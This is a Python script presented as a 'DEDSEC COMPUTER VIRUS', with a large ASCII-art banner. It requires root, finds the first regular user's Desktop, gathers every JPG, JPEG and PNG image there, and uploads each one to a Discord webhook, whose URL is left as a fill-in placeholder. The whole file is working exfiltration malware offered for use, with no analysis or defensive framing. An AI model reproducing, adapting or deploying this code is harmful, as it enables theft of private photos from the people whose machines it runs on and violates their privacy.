#coded by: 0xbit
import os, sys, subprocess
from termcolor import colored
import glob
from discord_webhook import DiscordWebhook
import random

def check_root():
    os.system('clear')
    if not os.geteuid()==0:
        sys.exit('\nThis script must be run as root!\n')
    else:
        banner()
        pass

output = subprocess.check_output(['getent','passwd', '1000'])
words = output.decode().split()

for line in words:
    command = f"echo '{line}' | cut -d: -f1"
    output = subprocess.check_output(command, shell=True)
    username = (output.decode().strip())
    break

banner_text = colored('WE KILL ANIMALS', 'white')
banner_author = colored('DEDSEC COMPUTER VIRUS', 'white')

def banner():
    os.system('clear')
    print(colored(f'''
    
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⢖⣠⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⠎⠀⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⢿⣤⠴⠒⢦⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⠿⠛⠁⠸⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⣧⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠂⠾⠿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣷⣤⡀⠈⠉⠑⠒⠤⢀⡀⠀⠀⠀⠀⣿⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠟⠿⠿⢿⣿⣿⣆⠀⠀⠀⠀⠀⠈⠑⢄⠀⠀⣿⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⡏⡄⠀⠀⠀⠈⠻⣿⣧⠀⠀⠀⠀⠀⠀⠀⢳⠀⣿⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡀⣷⠄⠀⠀⠀⠀⠙⢿⣇⡀⠀⠀⠀⠀⠀⠀⣷⡇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡿⠐⣁⣀⣀⢀⣾⣤⢤⣶⣿⣿⣦⡀⠀⠀⠀⠀⢸⠇⠀⠀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣇⣾⣿⣿⣿⡇⠀⠻⣽⣿⣿⣿⡿⠿⣦⠀⠀⠀⡟⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⡟⣌⡻⠛⠁⢰⠸⡔⣤⣉⡩⠐⠁⠀⢸⡇⠀⢰⠃⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣇⠀⠉⠀⠀⠀⠀⠀⠈⠙⠻⣶⢶⣶⣾⠇⢀⡏⠀⠀⠰⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⢋⣿⣿⣿⣿⣿⣿⣿⣷⠀⠤⠒⠒⠓⠘⠀⢴⢏⡟⠈⣿⠀⡞⠀⠀⢀⡇⠀⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⡿⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⠀⡰⠞⠛⠛⠛⠳⠶⠿⠁⣰⣿⣼⠃⠀⠀⡼⢿⣶⡀⡇⠀⢀⠔⠚⠛⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⠟⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣿⠟⠋⠉⠉⠁⠀⠀⢠⣿⣿⠃⠀⠀⠰⠁⠘⢿⠔⢀⣠⠇⣶⣶⣶⢠⣆⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⡟⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣏⠻⠖⠂⠈⠒⠂⢀⣠⣿⣿⠏⠀⠀⢀⣧⣶⡶⢖⣿⠇⡿⠀⣿⣿⠏⣸⣿⡆⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣏⠩⠭⣼⣿⣿⠏⠀⠀⠀⡼⠛⢉⣴⣿⠏⣸⡇⢀⣿⡏⠀⣿⣿⠇⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⠏⠀⠀⠀⡼⢁⣴⣿⡿⠁⣰⣿⠁⣸⣿⠀⢀⣿⡿⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠿⠛⢛⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⣰⣿⣿⡿⠋⠀⣰⣿⡟⢠⣿⡇⠀⣸⣿⠃⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⢠⣿⡿⠛⠁⠀⣼⣿⣿⣧⣿⣿⠁⢀⣿⡏⠀⠀⠀⠀⠘⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠟⢻⠐⠉⠑⠤⣀⢠⣿⣿⠀⠀⢀⣾⣿⣿⣿⣿⣿⡟⠀⣼⣿⠁⠀⠀⣿⠀⠀⢡⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⢱⠹⠉⢉⠉⠓⠶⠤⠍⠛⢻⡄⣠⣿⣿⣿⣿⣿⣿⣿⣇⣼⣿⠃⠀⠀⢠⣿⡀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀
⢸⠀⠀⠀⠀⠀⠀       ⠀⠀⠀⣼⣿⣿⣿⠉⠉⠑⠛⠛⠛⠳⢄⣀⠈⢹⠤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⣸⣿⣇⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀    ⠀⠀  ⣀⣼⣿⣿⡿⠉⡗⠒⠒⠶⠶⢤⣀⠃⠀⣰⢺⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⠘⢿⣿⣿⡣⠀⣓⣤⠤⣤⠀⡸⠓⢲⠞⠸⡀⢣⢸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⣸⣿⣿⣿⡇⠀⠀⢱⠀⠀⠀⠀⠀⠀
                            {banner_text}
                         {banner_author}
    ''', 'red'))

check_root()

folder_path = f'/home/{username}/Desktop'

extensions = ('*.jpg', '*.png', '*.jpeg')

file_paths = []

webhook_url = 'YOUR WEBHOOK LINK HERE'

for extension in extensions:
    files = glob.glob(os.path.join(folder_path, extension))
    file_paths += files

file_paths.sort()

with open('.data.txt', 'w') as f:
    for file_path in file_paths:
        f.write(f'{file_path}\n')

with open('.data.txt', 'r') as f:
    file_paths = [line.rstrip('\n') for line in f]

def webhook(file_path):
    os.path.splitext(file_path)
    with open(file_path, "rb") as f:
        filename = os.path.basename(file_path)
        webhook = DiscordWebhook(url=webhook_url, username="dump pictures")
        webhook.add_file(file=f.read(), filename=filename)
        webhook.execute()

for file_path in file_paths:
    webhook(file_path)